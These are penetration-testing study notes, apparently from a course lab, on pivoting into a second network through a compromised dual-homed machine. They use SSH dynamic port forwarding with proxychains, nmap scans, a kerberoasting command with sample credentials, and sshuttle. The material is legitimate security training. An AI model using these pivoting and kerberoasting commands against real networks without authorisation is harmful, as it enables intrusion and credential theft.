If we find a machine that has multiple NICs on it, we can use that machine to pivot to that 2nd network.

Here we have 2 machines, one with 10.10.155.5 (original network) and the other with 10.10.10.5 (2nd NIC network)

Proxychains
	`cat /etc/proxychainsX.conf`    This will cat out the proxychains conf file.  Use `tab` to autofill as X will vary from version to version.  You're looking for the port on the bottom of the page.
	`ssh -f -N -D 9050 -i pivot root@10.10.155.5`
		-f  will background the ssh connection
		-N   Do not excecute remote commands, great for port forwarding
		-D 9050     This is the port to bind to (same port as the port in your proxychains file)
	Now we are connecting to the 10.10.155.5 machine via ssh and have bound that connection to the port listed in the .conf file, 9050.
	Now, you can use `proxychains` to run commands through the proxy'd machine
	`proxychains nmap -p80 10.10.10.225`  This will now proxychain through and scan the device on that 2nd network.
		You can run other commands through this as well, some of the output may need a harder look though.
		You can add `-sT` in order to pick up things through proxychains like -Pn when ping probes are being blocked.
	`proxychains GetUserSPNs.py PNPT.local/fcastle:Password1 -dc-ip 10.10.10.225 -request`
		This is a kerberoasting attack run through proxychains
	`proxychains firefox`   - this will open a firefox through the proxy, granting you access to possible internal websites in that new network

Sshuttle  (Not installed by default, `sudo pip install sshuttle`)
	`sshuttle -r root@10.10.155.5 10.10.10.0/24 --ssh-cmd "ssh -i pivot"`
		`-r root@10.10.155.5 10.10.10.0/24`    We're remoting in with the root user at 10.10.155.5 and using that to establish a connection to the new network, 10.10.10.0/24
		`--ssh-cmd "ssh -i pivot"`   Is the ssh command we want to run to connect to that network
			Once you hit enter, you should see `c : connected to server`
	Now you can communicate with that new network as long as that tab is running.  It's like adding your own route to a machine that you have compromised in order to access a different network.
